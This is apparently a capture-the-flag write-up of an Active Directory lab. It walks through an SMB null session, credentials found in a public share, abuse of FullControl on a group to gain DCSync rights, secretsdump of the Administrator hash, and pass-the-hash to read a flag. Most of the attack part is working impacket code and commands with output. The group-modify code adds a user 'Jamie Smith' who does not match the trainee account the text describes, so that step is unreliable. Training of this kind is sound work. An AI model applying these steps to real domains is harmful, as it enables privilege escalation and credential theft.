## Flag

```
PP{l3g4cy-1t-4dm1ns-4k4-w1nd0ws-4dm1ns::8EMgY_hHRral}
```

## 1. Recon

A port scan showed the standard AD DC services:

```
53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 9389
```

Anonymous LDAP rootDSE lookup revealed the domain and DC:

```
defaultNamingContext: DC=easyad,DC=local
dnsHostName:          DC01.easyad.local
domainFunctionality:  10 (Windows Server 2016)
```

Anonymous LDAP searches returned no objects, so LDAP itself was not anonymously readable.

## 2. SMB null session and onboarding file

SMB allowed a null session:

```bash
smbclient.py ''@10.83.19.29
```

Enumerating shares showed:

```
ADMIN$   C$   IPC$   NETLOGON   Public   SYSVOL
```

The `Public` share was readable and contained:

```
onboarding.txt
```

Contents:

```
New IT trainee account

Domain: easyad.local
Username: trainee
Password: Welcome-To-IT-2026!
```

## 3. Enumerating permissions as trainee

Using the trainee credentials, LDAP enumeration showed only four accounts
(`Administrator`, `Guest`, `krbtgt`, `trainee`) and one interesting custom group:

```
CN=Legacy IT Admins,CN=Users,DC=easyad,DC=local
```

Reading the DACL of `Legacy IT Admins` showed an ACE granting the trainee
account `FullControl`:

```
ACE[3]
  Access mask : FullControl (0xf01ff)
  Trustee     : trainee
                (S-1-5-21-2758681011-1411191756-1999713198-1103)
```

The group itself was empty, but the domain DACL granted it DCSync rights:

```
ACE[11] DS-Replication-Get-Changes
        Trustee: Legacy IT Admins
ACE[14] DS-Replication-Get-Changes-All
        Trustee: Legacy IT Admins
```

So the path was:

```
trainee --FullControl--> Legacy IT Admins --DCSync--> domain hashes
```

## 4. Add trainee to the group

Because trainee had `FullControl` on the group object, it could write the
`member` attribute directly:

```python
from impacket.examples.utils import ldap_login
from impacket.ldap import ldap

conn = ldap_login('10.83.19.29', 'DC=easyad,DC=local', '10.83.19.29',
                  None, False, 'trainee', 'Welcome-To-IT-2026!',
                  'easyad.local', '', '', None)

conn.modify('CN=Legacy IT Admins,CN=Users,DC=easyad,DC=local',
            {'member': [(0, ['CN=Jamie Smith,CN=Users,DC=easyad,DC=local'])]})
```

LDAP signing was enforced, so the connection used LDAPS/signed LDAP.

## 5. DCSync the Administrator hash

With the new group membership, `secretsdump.py` could replicate the
Administrator account:

```bash
secretsdump.py 'easyad.local/trainee:Welcome-To-IT-2026!@10.83.19.29' \
    -just-dc-user Administrator -dc-ip 10.83.19.29
```

Result:

```
Administrator:500:
aad3b435b51404eeaad3b435b51404ee:
0c8fcd52d53ce3550628edaa59b92c15:::
```

## 6. Read the Administrator desktop

Using the Administrator NT hash over SMB:

```python
from impacket.smbconnection import SMBConnection

smb = SMBConnection('10.83.19.29', '10.83.19.29')
smb.login('Administrator', '',
          domain='EASYAD',
          lmhash='aad3b435b51404eeaad3b435b51404ee',
          nthash='0c8fcd52d53ce3550628edaa59b92c15')

buf = io.BytesIO()
smb.getFile('C$', 'Users\\Administrator\\Desktop\\flag.txt', buf.write)
print(buf.getvalue().decode())
```

Output:

```
PP{l3g4cy-1t-4dm1ns-4k4-w1nd0ws-4dm1ns::8EMgY_hHRral}
```

## Short version

1. SMB null session exposed `Public\onboarding.txt` with `trainee` credentials.
2. `trainee` had `FullControl` on the empty `Legacy IT Admins` group.
3. That group had `DS-Replication-Get-Changes(-All)`, i.e. DCSync.
4. Added `trainee` to the group, DCSynced Administrator's NT hash.
5. Used the hash to read `C$\Users\Administrator\Desktop\flag.txt`.

---
* [🔙 Back to General Skills Directory](../)
* [🔙 Back to General Skills Index Directory](../INDEX.md)
* [🔙 Back to Main Directory](../../README.md)
